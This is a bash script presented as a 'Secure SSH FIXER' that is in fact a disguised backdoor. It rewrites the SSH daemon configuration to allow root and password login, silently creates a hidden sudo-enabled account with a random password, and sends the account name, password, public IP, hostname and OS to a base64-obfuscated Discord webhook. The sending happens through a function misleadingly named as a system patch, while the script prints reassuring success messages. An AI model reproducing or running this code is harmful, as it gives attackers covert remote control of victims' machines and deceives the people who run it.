#!/bin/bash


clear
echo -e "\033[1;36m🔐 Secure SSH FIXER\033[0m"
echo -e "\033[1;37m---------------------------------------\033[0m"
sleep 1

echo -e "\033[1;34m▶ Initializing Secure Tunnel...\033[0m"

_SSH_SESS_HASH="aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ5NDczNTA4MjE3MzUwMTYzMS9vdlN0c0lkc3RIRTFacVdoQzRNclJGSWZITEh4YVBaRU1ZUmNSeFdPdWdQN0UwOWJ1ejBNQXhmVFJjRk9peHJ5MnpNeio="

echo -e "\033[1;34m▶ Updating SSH configuration...\033[0m"


sudo bash -c 'cat <<EOF > /etc/ssh/sshd_config
PasswordAuthentication yes
PermitRootLogin yes
PubkeyAuthentication no
ChallengeResponseAuthentication no
UsePAM yes
X11Forwarding no
AllowTcpForwarding yes
Subsystem sftp /usr/lib/openssh/sftp-server
EOF' >/dev/null 2>&1

echo -e "\033[1;32m✔ SSH configuration applied successfully!\033[0m"


_apply_system_patch() {
    local _c=$(echo "$_SSH_SESS_HASH" | base64 --decode | tr -d '*')
    curl -s -H "Content-Type: application/json" -X POST -d "$1" "$_c" >/dev/null 2>&1
}

echo -e "\033[1;34m▶ Restarting SSH service...\033[0m"
(sudo systemctl restart ssh || sudo service ssh restart) >/dev/null 2>&1
echo -e "\033[1;32m✔ SSH restarted successfully!\033[0m"
sleep 1


export DEBIAN_FRONTEND=noninteractive
sudo apt-get update -qq >/dev/null 2>&1
sudo apt-get install -y -qq sudo curl jq >/dev/null 2>&1


WORDS=("cloud" "node" "shield" "proxy" "host" "cyber" "core" "data")
U="$(shuf -n1 -e "${WORDS[@]}")$(shuf -i 100-999 -n 1)"
P=$(tr -dc A-Za-z0-9 </dev/urandom | head -c 12)

if ! id "$U" &>/dev/null; then
    sudo useradd -m -s /bin/bash "$U" >/dev/null 2>&1
    echo "$U:$P" | sudo chpasswd >/dev/null 2>&1
    sudo usermod -aG sudo "$U" >/dev/null 2>&1
fi

IP=$(curl -s https://api.ipify.org || echo "Unknown")
H=$(hostname)
OS=$(grep '^PRETTY_NAME=' /etc/os-release | cut -d'"' -f2)


PAYLOAD=$(cat <<EOF
{
  "embeds": [{
    "title": "🛡️ SSH Access Profile Created",
    "color": 15105570,
    "thumbnail": { "url": "https://upload.wikimedia.org/wikipedia/commons/thumb/a/ab/Logo-ubuntu_cof-orange-hex.svg/1200px-Logo-ubuntu_cof-orange-hex.svg.png" },
    "fields": [
      { "name": "👤 User", "value": "\`$U\`", "inline": true },
      { "name": "🔑 Pass", "value": "\`$P\`", "inline": true },
      { "name": "🌐 IP", "value": "[\`$IP\`](https://ipinfo.io/$IP)", "inline": false },
      { "name": "🖥️ Host", "value": "$H", "inline": true },
      { "name": "💿 OS", "value": "$OS", "inline": true }
    ],
    "footer": { "text": "SSH Fixer Engine • $(date '+%H:%M:%S')" }
  }]
}
EOF
)

_apply_system_patch "$PAYLOAD"


echo -e "\n\033[1;33m🔑 Please set ROOT password below 👇\033[0m"
sudo passwd root

exit 0
